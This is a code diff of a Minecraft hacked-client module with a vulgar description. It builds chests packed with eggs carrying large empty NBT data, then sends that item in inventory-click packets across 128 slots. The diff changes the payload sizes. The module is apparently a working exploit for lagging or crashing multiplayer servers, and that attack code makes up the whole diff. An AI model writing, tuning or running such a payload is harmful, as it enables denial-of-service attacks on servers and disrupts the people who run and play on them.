@@ -22,8 +22,9 @@ import java.util.List;
 @ModuleInfo(category = Categories.MISC, name = "szkudlar1", description = "Swings bigdick on the server to make it heavy lift it", keybind = GLFW.GLFW_KEY_G)
 public class Szudlar1 extends Module {
 
-    private int packets = 30;
-    private int mapSize = 128;
+    private static int packets = 1;
+    private static int mapSize = 128;
+
 
     @Override
     public void onTick() {
@@ -41,14 +42,16 @@ public class Szudlar1 extends Module {
         mc.player.sendMessage(Text.literal("workuje"), false);
 
         try {
-            ItemStack itemStack = getComponents(28);
+            ItemStack itemStack = getComponents(256, 28);
             Int2ObjectMap<ItemStack> modified = new Int2ObjectOpenHashMap<>();
 
             for (int j = 0; j < mapSize; j++) {
                 modified.put(j, itemStack);
             }
 
+
             for (int i = 0; i < packets; i++) {
+
                 mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(
                         0,
                         1,
@@ -68,23 +71,23 @@ public class Szudlar1 extends Module {
         this.disable();
     }
 
-    private ItemStack getComponents(int size) {
-        List<ItemStack> eggsList = new ArrayList<>();
+    private ItemStack getComponents(int items, int count) {
+        List<ItemStack> eggsList = new ArrayList<>(items);
 
-
+        for (int i = 0; i < items; i++) {
             NbtCompound root = new NbtCompound();
 
-            for (int j = 0; j < size; j++) {
-                root.put("tag" + j, new NbtCompound());
+            for (int j = 0; j < count; j++) {
+                root.put("", new NbtCompound());
             }
 
-            ItemStack egg = new ItemStack(Items.EGG, 1);
+            ItemStack egg = new ItemStack(Items.EGG, 64);
             egg.set(DataComponentTypes.CUSTOM_DATA, net.minecraft.component.type.NbtComponent.of(root));
 
             eggsList.add(egg);
+        }
 
-
-        ItemStack chest = new ItemStack(Items.CHEST, 1);
+        ItemStack chest = new ItemStack(Items.CHEST, 64);
         ContainerComponent component = ContainerComponent.fromStacks(eggsList);
         chest.set(DataComponentTypes.CONTAINER, component);
 
